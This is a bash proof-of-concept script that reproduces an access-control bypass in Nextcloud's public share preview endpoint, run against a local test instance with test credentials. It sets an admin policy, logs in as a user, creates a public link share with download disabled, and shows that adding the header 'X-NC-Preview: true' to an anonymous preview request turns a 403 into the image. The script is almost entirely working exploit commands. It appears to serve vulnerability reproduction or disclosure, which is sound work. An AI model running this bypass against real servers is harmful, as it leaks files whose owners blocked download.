#!/bin/bash
set -e
BASE="http://127.0.0.1:31666"
JAR=/tmp/alice_preview_$$.jar
rm -f "$JAR"

echo "=== 1) admin sets shareapi_allow_view_without_download=no ==="
curl -sS -u admin:admin_pw_31666 -X POST \
  -H "OCS-APIREQUEST: true" \
  --data-urlencode "value=no" \
  "$BASE/ocs/v2.php/apps/provisioning_api/api/v1/config/apps/core/shareapi_allow_view_without_download" \
  -w "\n[%{http_code}]\n" | head -c 200
sleep 2

echo
echo "=== 2) alice login via cookie ==="
RT=$(curl -sS -c "$JAR" "$BASE/login" | grep -oE 'data-requesttoken="[^"]+"' | head -1 | cut -d'"' -f2)
curl -sS -b "$JAR" -c "$JAR" -X POST "$BASE/login" \
  -H "Origin: $BASE" -H "requesttoken: $RT" \
  --data-urlencode "user=alice" \
  --data-urlencode "password=alice_pw_31666" \
  --data-urlencode "requesttoken=$RT" \
  -o /dev/null -w "[login %{http_code} -> %{redirect_url}]\n"
sleep 2

echo
echo "=== 3) alice creates public link share for Nextcloud.png with hide-download attribute ==="
SHARE_JSON=$(curl -sS -b "$JAR" -X POST \
  -H "requesttoken: $RT" \
  -H "OCS-APIREQUEST: true" \
  --data-urlencode "path=/Nextcloud.png" \
  --data-urlencode "shareType=3" \
  --data-urlencode "permissions=1" \
  --data-urlencode 'attributes=[{"scope":"permissions","key":"download","value":false}]' \
  "$BASE/ocs/v2.php/apps/files_sharing/api/v1/shares?format=json")
echo "$SHARE_JSON" | head -c 600
echo
TOKEN=$(echo "$SHARE_JSON" | grep -oE '"token":"[^"]+"' | head -1 | cut -d'"' -f4)
echo "[+] share token=$TOKEN"
sleep 2

echo
echo "=== 4) BASELINE: anonymous preview WITHOUT X-NC-Preview (expect 403) ==="
curl -sS "$BASE/index.php/apps/files_sharing/publicpreview/$TOKEN?file=Nextcloud.png&x=200&y=200" \
  -o /tmp/baseline.bin -D /tmp/baseline.hdr -w "\n[HTTP %{http_code} bytes=%{size_download}]\n"
echo "--- baseline headers:"
grep -E "^HTTP|Content-Type|Content-Length" /tmp/baseline.hdr | head -5
echo "--- baseline body (first 100 bytes):"
head -c 100 /tmp/baseline.bin | od -An -c | head -1
sleep 2

echo
echo "=== 5) BYPASS: same request WITH X-NC-Preview: true (expect 200 image) ==="
curl -sS -H "X-NC-Preview: true" \
  "$BASE/index.php/apps/files_sharing/publicpreview/$TOKEN?file=Nextcloud.png&x=200&y=200" \
  -o /tmp/bypass.bin -D /tmp/bypass.hdr -w "\n[HTTP %{http_code} bytes=%{size_download}]\n"
echo "--- bypass headers:"
grep -E "^HTTP|Content-Type|Content-Length" /tmp/bypass.hdr | head -5
echo "--- bypass body magic bytes:"
od -An -tx1 -N 16 /tmp/bypass.bin
file /tmp/bypass.bin
sleep 2

echo
echo "=== 6) cleanup: revert admin policy ==="
curl -sS -u admin:admin_pw_31666 -X DELETE \
  -H "OCS-APIREQUEST: true" \
  "$BASE/ocs/v2.php/apps/provisioning_api/api/v1/config/apps/core/shareapi_allow_view_without_download" \
  -w "\n[cleanup %{http_code}]\n" | tail -2
